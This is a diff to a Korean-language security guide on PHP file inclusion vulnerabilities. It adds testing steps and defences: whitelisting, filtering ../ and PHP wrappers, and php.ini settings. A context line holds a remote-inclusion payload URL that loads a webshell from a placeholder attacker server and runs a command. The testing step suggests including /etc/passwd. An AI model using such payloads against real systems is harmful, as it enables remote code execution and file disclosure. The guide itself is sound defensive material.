@@ -65,10 +65,34 @@ http://target.com/index.php?file=http://[ATTACKER_SERVER]/webshell.php?cmd=ls
 
 # 2. 점검 방법
 
+먼저 파일을 include 하는 기능을 찾는다. 그리고 서버 내부에 존재할만한 파일 이름(/etc/passwd, boot.ini 등)을 입력해보며 서버 내부의 파일이 include 가능한지 테스트한다.
+
 # 3. 대응 방안
+
+## 3.1. 화이트리스트를 사용한 검증
+
+파일을 include 하는 기능에 서버 내부에서 화이트리스트를 적용하여 특정 파일 이외에는 include 할 수 없도록 검증하여야 한다.
+
+## 3.2. 입력값 검증
+
+서버 내부의 다른 파일에 접근하기 위해 필요한 ../ 특수문자와 PHP Wrapper(php://, file:// 등)를 필터링한다. 다만, 해당 문자열들만 필터링할 경우 서버의 소스코드 파일은 보호할 수 없어 완벽한 대응 방안은 아니다.
+
+## 3.3. 서버 설정 변경 (PHP)
+
+php.ini 파일에서 다음과 같이 설정한다.
+
+```
+....
+allow_url_fopen = Off
+allow_url_include = Off
+display_errors = Off
+....
+```
 
 # 4. 참고
 
 - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
 
 - https://www.php.net/manual/en/wrappers.php
+
+- https://medium.com/@althubianymalek/exploring-php-wrappers-enhancing-php-capabilities-280a6af827b5
